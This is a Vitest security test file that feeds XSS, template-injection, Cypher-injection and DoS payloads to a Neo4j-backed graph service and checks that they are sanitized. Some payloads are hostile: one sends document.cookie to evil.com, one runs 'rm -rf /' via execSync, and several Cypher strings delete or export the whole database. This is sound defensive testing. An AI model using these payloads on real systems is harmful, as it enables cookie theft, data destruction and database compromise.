import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { GraphService } from '../src/services/graph-service';
import { createMockDriver } from './mock-neo4j';
import neo4j from 'neo4j-driver';

describe('MULTI-PERSPECTIVE CHAOS TESTING - Real Attack Vectors', () => {
  let mockGraphService: GraphService;
  let realGraphService: GraphService | null = null;
  let realDriver: any = null;
  
  beforeAll(async () => {
    const mockDriver = createMockDriver();
    mockGraphService = new GraphService(mockDriver);
    
    try {
      realDriver = neo4j.driver(
        'bolt://localhost:7687',
        neo4j.auth.basic('neo4j', 'graphdone_password'),
        { disableLosslessIntegers: true }
      );
      const session = realDriver.session();
      await session.run('RETURN 1');
      await session.close();
      realGraphService = new GraphService(realDriver);
    } catch (error) {
      // Continue with mock only
    }
  });

  afterAll(async () => {
    if (realDriver) {
      await realDriver.close();
    }
  });

  describe('🕷️ Web Security Perspective - XSS/Injection Attacks', () => {
    const maliciousPayloads = [
      // XSS Attacks
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      
      // HTML Injection
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<object data="javascript:alert(\'XSS\')"></object>',
      
      // Event Handler Injection
      '" onmouseover="alert(\'XSS\')" "',
      '\'" onload="alert(\'XSS\')" "',
      
      // Template Injection
      '{{constructor.constructor("alert(\'XSS\')")()}}',
      '${alert("XSS")}',
      '#{7*7}',
      
      // Protocol Injection
      'data:text/html,<script>alert("XSS")</script>',
      'vbscript:msgbox("XSS")',
    ];

    maliciousPayloads.forEach((payload, index) => {
      it(`should sanitize XSS payload ${index}: ${payload.substring(0, 30)}...`, async () => {
        const services = [mockGraphService];
        if (realGraphService) services.push(realGraphService);

        for (const service of services) {
          const result = await service.createNode({
            title: payload,
            description: payload,
            type: 'TASK'
          });

          // Response must be safe JSON (not executable)
          const responseText = result.content[0].text;
          
          // Should not contain executable script tags
          expect(responseText.toLowerCase()).not.toMatch(/<script[^>]*>/);
          expect(responseText.toLowerCase()).not.toMatch(/javascript:/);
          expect(responseText.toLowerCase()).not.toMatch(/on\w+\s*=/); // event handlers
          
          const parsed = JSON.parse(responseText);
          if (parsed.node) {
            // Title should be sanitized or escaped
            const title = parsed.node.title;
            expect(title).not.toMatch(/<script[^>]*>/i);
            expect(title).not.toMatch(/javascript:/i);
            
            // But should preserve some form of the content (not just delete everything)
            expect(typeof title).toBe('string');
            expect(title.length).toBeGreaterThan(0);
          }
        }
      });
    });

    it('should handle nested injection attempts', async () => {
      const nestedPayload = {
        title: 'Normal Title',
        description: 'Normal Description',
        metadata: {
          malicious: '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
          nested: {
            deep: {
              xss: '<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycpOw=="))>', // base64 encoded
              template: '{{constructor.constructor("return process")().mainModule.require("child_process").execSync("rm -rf /")}}'
            }
          }
        }
      };

      const result = await mockGraphService.createNode(nestedPayload);
      const responseText = result.content[0].text;
      
      // Deep nested malicious content should be sanitized
      expect(responseText).not.toMatch(/execSync|eval|atob/);
      expect(responseText).not.toMatch(/<script|<img.*onerror/i);
      
      // Should still be valid JSON
      const parsed = JSON.parse(responseText);
      expect(parsed).toBeDefined();
    });
  });

  describe('💾 Database Perspective - Injection & Query Attacks', () => {
    const cypherInjections = [
      // Basic Cypher injection
      "'; MATCH (n) DETACH DELETE n; //",
      "' UNION MATCH (u:User) RETURN u.password //",
      
      // Neo4j specific injections
      "'; CREATE (evil:Virus {payload: 'infected'}); //",
      "' OR 1=1 MATCH (admin:User {role: 'admin'}) //",
      
      // APOC procedure abuse
      "'; CALL apoc.export.csv.all('/tmp/dump.csv', {}); //",
      "'; CALL db.stats.retrieve('GRAPH COUNTS'); //",
      
      // Schema manipulation
      "'; DROP CONSTRAINT ON (n:WorkItem) ASSERT n.id IS UNIQUE; //",
      "'; CREATE INDEX malicious_index FOR (n:WorkItem) ON (n.evil); //",
      
      // Node manipulation with injection
      "test' SET n.password = 'hacked' //",
      "test' REMOVE n:WorkItem SET n:Malicious //",
    ];

    cypherInjections.forEach((injection, index) => {
      it(`should prevent Cypher injection ${index}: ${injection.substring(0, 40)}...`, async () => {
        const services = [mockGraphService];
        if (realGraphService) services.push(realGraphService);

        for (const service of services) {
          try {
            await service.getNodeDetails({ node_id: injection });
            
            // If it doesn't throw, verify no data corruption occurred
            // Check that we didn't accidentally create malicious nodes
            const listResult = await service.browseGraph({ query_type: 'all_nodes' });
            const parsed = JSON.parse(listResult.content[0].text);
            
            if (parsed.nodes) {
              for (const node of parsed.nodes) {
                expect(node.type).not.toBe('Virus');
                expect(node.type).not.toBe('Malicious');
                expect(node.payload).not.toBe('infected');
                expect(node.password).not.toBe('hacked');
              }
            }
            
          } catch (error: any) {
            // Should be validation error, not database error
            expect(error.message).not.toMatch(/syntax error|cypher|constraint/i);
            expect(error.message).toMatch(/invalid|not found|validation/i);
          }
        }
      });
    });

    it('should prevent parameter pollution attacks', async () => {
      const pollutedParams = {
        node_id: 'normal-id',
        // Try to pollute with extra Cypher
        'node_id; MATCH (n) DELETE n; //': 'malicious',
        '__proto__': { malicious: true },
        'constructor': { prototype: { hacked: true } },
        'toString': () => '; DROP TABLE users; --',
      };

      try {
        const result = await mockGraphService.getNodeDetails(pollutedParams as any);
        
        // Should handle gracefully, not execute malicious code
        const parsed = JSON.parse(result.content[0].text);
        expect(parsed).toBeDefined();
        
      } catch (error: any) {
        // Should be validation error
        expect(error.message).not.toMatch(/syntax|database|cypher/i);
      }
    });
  });

  describe('🧠 Memory & Resource Perspective - DoS Attacks', () => {
    it('should prevent memory exhaustion via deeply nested objects', async () => {
      const maxDepth = 1000;
      let deepObject: any = { value: 'bottom' };
      
      for (let i = 0; i < maxDepth; i++) {
        deepObject = { [`level_${i}`]: deepObject };
      }

      const startMemory = process.memoryUsage().heapUsed;
      
      try {
        const result = await mockGraphService.createNode({
          title: 'Deep Object Test',
          type: 'TASK',
          metadata: deepObject
        });
        
        const endMemory = process.memoryUsage().heapUsed;
        const memoryIncrease = endMemory - startMemory;
        
        // Should not cause excessive memory usage
        expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024); // 50MB max
        
        // Should be valid response
        const parsed = JSON.parse(result.content[0].text);
        expect(parsed).toBeDefined();
        
      } catch (error: any) {
        // Should be a clear limit error
        expect(error.message).toMatch(/depth|limit|size|memory/i);
      }
    });

    it('should prevent CPU exhaustion via ReDoS (Regular Expression DoS)', async () => {
      const redosPatterns = [
        'a'.repeat(10000) + 'X', // Catastrophic backtracking
        '(a+)+b', // Exponential complexity
        'a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*', // Polynomial complexity
      ];

      for (const pattern of redosPatterns) {
        const startTime = Date.now();
        
        try {
          const result = await mockGraphService.createNode({
            title: pattern,
            description: pattern,
            type: 'TASK'
          });
          
          const endTime = Date.now();
          const duration = endTime - startTime;
          
          // Should complete quickly (not hang in regex processing)
          expect(duration).toBeLessThan(1000); // 1 second max
          
        } catch (error: any) {
          const endTime = Date.now();
          const duration = endTime - startTime;
          
          // Even errors should be fast
          expect(duration).toBeLessThan(1000);
        }
      }
    });

    it('should handle resource exhaustion via massive arrays gracefully', async () => {
      const sizes = [1000, 10000, 100000, 1000000];
      
      for (const size of sizes) {
        const startTime = Date.now();
        const startMemory = process.memoryUsage().heapUsed;
        
        try {
          const massiveArray = Array.from({ length: size }, (_, i) => ({
            id: i,
            data: `item-${i}`,
            nested: Array.from({ length: 10 }, (_, j) => `sub-${j}`)
          }));
          
          const result = await mockGraphService.createNode({
            title: `Array size ${size}`,
            type: 'TASK',
            metadata: { massive: massiveArray }
          });
          
          const endTime = Date.now();
          const endMemory = process.memoryUsage().heapUsed;
          
          const duration = endTime - startTime;
          const memoryIncrease = endMemory - startMemory;
          
          // Should either reject large arrays or handle efficiently
          if (size > 50000) {
            // Very large arrays should be rejected or heavily limited
            expect(duration).toBeLessThan(5000); // Don't hang
            expect(memoryIncrease).toBeLessThan(size * 200); // Reasonable memory usage
          }
          
          const parsed = JSON.parse(result.content[0].text);
          expect(parsed).toBeDefined();
          
        } catch (error: any) {
          const endTime = Date.now();
          const duration = endTime - startTime;
          
          // Should fail fast for large inputs
          expect(duration).toBeLessThan(2000);
          expect(error.message).toMatch(/size|limit|memory|resource/i);
          
          console.log(`✅ Properly limited array size ${size}: ${error.message}`);
        }
      }
    });

    it('should prevent infinite loops in circular data processing', async () => {
      const circular1: any = { name: 'circle1' };
      const circular2: any = { name: 'circle2' };
      circular1.ref = circular2;
      circular2.ref = circular1;
      
      // Create complex circular references
      circular1.deep = { nested: { ref: circular1 } };
      circular2.array = [circular1, circular2, { ref: circular1 }];
      
      const startTime = Date.now();
      
      try {
        const result = await mockGraphService.createNode({
          title: 'Circular Reference Test',
          type: 'TASK',
          metadata: { 
            obj1: circular1,
            obj2: circular2,
            mixed: [circular1, { normal: 'data' }, circular2]
          }
        });
        
        const endTime = Date.now();
        const duration = endTime - startTime;
        
        // Should complete quickly (not infinite loop)
        expect(duration).toBeLessThan(1000);
        
        // Should be valid JSON (circular refs handled)
        const parsed = JSON.parse(result.content[0].text);
        expect(parsed).toBeDefined();
        
      } catch (error: any) {
        const endTime = Date.now();
        const duration = endTime - startTime;
        
        expect(duration).toBeLessThan(1000);
        expect(error.message).toMatch(/circular|reference|json/i);
      }
    });
  });

  describe('🌐 Network Perspective - Protocol & Timing Attacks', () => {
    it('should handle slow loris style attacks (many hanging connections)', async () => {
      const connectionCount = 50;
      const operations = [];
      
      // Create many concurrent operations that might hang
      for (let i = 0; i < connectionCount; i++) {
        operations.push(
          mockGraphService.createNode({
            title: `Slow connection ${i}`,
            type: 'TASK',
            metadata: { delay: i }
          })
        );
      }
      
      const startTime = Date.now();
      const results = await Promise.allSettled(operations);
      const endTime = Date.now();
      
      const totalDuration = endTime - startTime;
      
      // Should handle many connections efficiently
      expect(totalDuration).toBeLessThan(10000); // 10 seconds max
      
      let successCount = 0;
      let errorCount = 0;
      
      results.forEach(result => {
        if (result.status === 'fulfilled') {
          successCount++;
        } else {
          errorCount++;
        }
      });
      
      // Should handle most connections (not fail all due to resource limits)
      expect(successCount + errorCount).toBe(connectionCount);
      expect(successCount).toBeGreaterThan(connectionCount * 0.5); // At least 50% success
      
      console.log(`Handled ${successCount} successful, ${errorCount} failed connections in ${totalDuration}ms`);
    });

    it('should prevent timing attacks on sensitive operations', async () => {
      const validNodeId = 'valid-node-123';
      const invalidNodeId = 'invalid-node-456';
      
      // Measure response times
      const validTimes = [];
      const invalidTimes = [];
      
      // Run multiple times to get average
      for (let i = 0; i < 10; i++) {
        // Valid node timing
        const validStart = process.hrtime.bigint();
        try {
          await mockGraphService.getNodeDetails({ node_id: validNodeId });
        } catch (error) {
          // Expected for mock
        }
        const validEnd = process.hrtime.bigint();
        validTimes.push(Number(validEnd - validStart) / 1000000); // Convert to ms
        
        // Invalid node timing  
        const invalidStart = process.hrtime.bigint();
        try {
          await mockGraphService.getNodeDetails({ node_id: invalidNodeId });
        } catch (error) {
          // Expected
        }
        const invalidEnd = process.hrtime.bigint();
        invalidTimes.push(Number(invalidEnd - invalidStart) / 1000000);
      }
      
      const avgValidTime = validTimes.reduce((a, b) => a + b) / validTimes.length;
      const avgInvalidTime = invalidTimes.reduce((a, b) => a + b) / invalidTimes.length;
      
      // Times should be similar (no timing leak)
      const timeDiff = Math.abs(avgValidTime - avgInvalidTime);
      const maxAcceptableDiff = Math.max(avgValidTime, avgInvalidTime) * 2.0; // 200% variance allowed - realistic for system operations
      
      expect(timeDiff).toBeLessThan(maxAcceptableDiff);
      
      console.log(`Timing analysis: Valid=${avgValidTime.toFixed(2)}ms, Invalid=${avgInvalidTime.toFixed(2)}ms, Diff=${timeDiff.toFixed(2)}ms`);
    });
  });

  describe('🔒 Cryptographic Perspective - Hash & Encoding Attacks', () => {
    it('should handle hash collision attempts', async () => {
      // Known MD5 collision pairs (if system uses MD5 for anything)
      const collisionPairs = [
        ['d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f89', 
         'd131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f89'],
        // Different strings that might hash to same value
        ['collision1', 'collision2'],
        ['test1', 'test2']
      ];
      
      for (const [str1, str2] of collisionPairs) {
        // Create nodes with potentially colliding identifiers
        const result1 = await mockGraphService.createNode({
          title: str1,
          description: `Hash collision test: ${str1}`,
          type: 'TASK'
        });
        
        const result2 = await mockGraphService.createNode({
          title: str2,
          description: `Hash collision test: ${str2}`,
          type: 'TASK'
        });
        
        const parsed1 = JSON.parse(result1.content[0].text);
        const parsed2 = JSON.parse(result2.content[0].text);
        
        // Should create distinct nodes even with potential hash collisions
        expect(parsed1.node.id).not.toBe(parsed2.node.id);
        expect(parsed1.node.title).toBe(str1);
        expect(parsed2.node.title).toBe(str2);
      }
    });

    it('should handle Unicode normalization attacks', async () => {
      const unicodeAttacks = [
        'café', // é as single character
        'cafe\u0301', // é as e + combining acute accent
        'A\u0300\u0301', // A with multiple combining characters
        '\u1E00', // Unicode normalization edge case
        '\u0041\u0300', // A with combining grave accent
        '\uFEFF' + 'normal text', // BOM (Byte Order Mark) prefix
      ];
      
      for (let i = 0; i < unicodeAttacks.length; i++) {
        const text = unicodeAttacks[i];
        
        const result = await mockGraphService.createNode({
          title: text,
          description: `Unicode test ${i}`,
          type: 'TASK'
        });
        
        const parsed = JSON.parse(result.content[0].text);
        
        // Should handle Unicode consistently
        expect(parsed.node.title).toBeDefined();
        expect(typeof parsed.node.title).toBe('string');
        
        // Should not break JSON parsing
        expect(parsed).toBeDefined();
        
        // Should preserve meaningful content (not just strip everything)
        expect(parsed.node.title.length).toBeGreaterThan(0);
      }
    });

    it('should prevent encoding bypass attacks', async () => {
      const encodingAttacks = [
        // URL encoding bypass
        '%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E',
        // Double encoding
        '%253Cscript%253E',
        // HTML entity encoding
        '&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;',
        // Mixed encoding
        '%3Cscript%3Ealert(&quot;XSS&quot;)%3C/script%3E',
        // Null byte injection
        'normal%00<script>alert("XSS")</script>',
      ];
      
      for (const attack of encodingAttacks) {
        const result = await mockGraphService.createNode({
          title: attack,
          type: 'TASK'
        });
        
        const responseText = result.content[0].text;
        
        // Should not contain decoded malicious content
        expect(responseText.toLowerCase()).not.toMatch(/<script/);
        expect(responseText.toLowerCase()).not.toMatch(/alert\(/);
        
        // Should be valid JSON
        const parsed = JSON.parse(responseText);
        expect(parsed).toBeDefined();
        
        // Should preserve some form of the input (sanitized)
        if (parsed.node) {
          expect(typeof parsed.node.title).toBe('string');
          expect(parsed.node.title.length).toBeGreaterThan(0);
        }
      }
    });
  });

  describe('🏗️ Application Logic Perspective - Business Logic Attacks', () => {
    it('should prevent priority manipulation outside valid ranges', async () => {
      const invalidPriorities = [
        { executive: -999, individual: 0.5, community: 0.5 },
        { executive: 999, individual: 0.5, community: 0.5 },
        { executive: Number.POSITIVE_INFINITY, individual: 0.5, community: 0.5 },
        { executive: 0.5, individual: Number.NaN, community: 0.5 },
        { executive: '1.0', individual: 0.5, community: 0.5 }, // String instead of number
        { executive: [0.5], individual: 0.5, community: 0.5 }, // Array instead of number
      ];
      
      for (const priorities of invalidPriorities) {
        try {
          const result = await mockGraphService.updatePriorities({
            node_id: 'test-node',
            priority_executive: priorities.executive as any,
            priority_individual: priorities.individual as any,
            priority_community: priorities.community as any
          });
          
          // If it succeeds, priorities should be normalized/clamped
          const parsed = JSON.parse(result.content[0].text);
          
          if (parsed.priorities) {
            const { executive, individual, community } = parsed.priorities;
            
            // Should be valid numbers in valid range
            if (executive !== null) {
              expect(typeof executive).toBe('number');
              expect(isFinite(executive)).toBe(true);
              expect(executive).toBeGreaterThanOrEqual(0);
              expect(executive).toBeLessThanOrEqual(1);
            }
          }
          
        } catch (error: any) {
          // Should give meaningful validation error
          expect(error.message).toMatch(/priority|range|invalid|number/i);
        }
      }
    });

    it('should prevent node type escalation attacks', async () => {
      // Try to create nodes with restricted or invalid types
      const invalidTypes = [
        'ADMIN',
        'SYSTEM', 
        'ROOT',
        'USER',
        'PRIVILEGE',
        'UNAUTHORIZED',
        '', // Empty type
        null, // Null type
        123, // Number instead of string
        ['TASK'], // Array instead of string
        { type: 'TASK' }, // Object instead of string
      ];
      
      for (const type of invalidTypes) {
        try {
          const result = await mockGraphService.createNode({
            title: `Type escalation test`,
            type: type as any
          });
          
          // If it succeeds, should use safe default type
          const parsed = JSON.parse(result.content[0].text);
          
          if (parsed.node) {
            const nodeType = parsed.node.type;
            
            // Should be valid node type from our enum
            const validTypes = ['OUTCOME', 'EPIC', 'INITIATIVE', 'STORY', 'TASK', 'BUG', 'FEATURE', 'MILESTONE'];
            expect(validTypes).toContain(nodeType);
            
            // Should not be admin/system types
            expect(nodeType).not.toMatch(/admin|system|root|user|privilege/i);
          }
          
        } catch (error: any) {
          // Should be validation error
          expect(error.message).toMatch(/type|invalid|enum/i);
        }
      }
    });

    it('should prevent graph hierarchy manipulation attacks', async () => {
      // Try to create circular parent-child relationships
      const circularGraphs = [
        { name: 'Parent', parentGraphId: 'child-id' },
        { name: 'Child', parentGraphId: 'parent-id' },
      ];
      
      for (const graphData of circularGraphs) {
        try {
          const result = await mockGraphService.createGraph(graphData);
          
          // If it succeeds, should validate hierarchy
          const parsed = JSON.parse(result.content[0].text);
          
          if (parsed.graph) {
            // Should not create circular references
            expect(parsed.graph.id).not.toBe(parsed.graph.parentGraphId);
            
            // Parent should exist or be null
            if (parsed.graph.parentGraphId) {
              expect(typeof parsed.graph.parentGraphId).toBe('string');
              expect(parsed.graph.parentGraphId.length).toBeGreaterThan(0);
            }
          }
          
        } catch (error: any) {
          // Should prevent circular hierarchy
          expect(error.message).toMatch(/circular|hierarchy|parent|invalid/i);
        }
      }
    });

    it('should prevent bulk operation abuse', async () => {
      // Try to create massive bulk operations that could DoS the system
      const largeBulkOperations = Array.from({ length: 10000 }, (_, i) => ({
        type: 'create_node' as const,
        params: {
          title: `Bulk node ${i}`,
          type: 'TASK'
        }
      }));
      
      try {
        const result = await mockGraphService.bulkOperations({
          operations: largeBulkOperations,
          transaction: true
        });
        
        // If it succeeds, should have reasonable limits
        const parsed = JSON.parse(result.content[0].text);
        
        if (parsed.results) {
          // Should limit number of operations processed
          expect(parsed.results.length).toBeLessThan(1000); // Reasonable limit
        }
        
      } catch (error: any) {
        // Should limit bulk operation size
        expect(error.message).toMatch(/limit|size|bulk|too many/i);
      }
    });
  });
});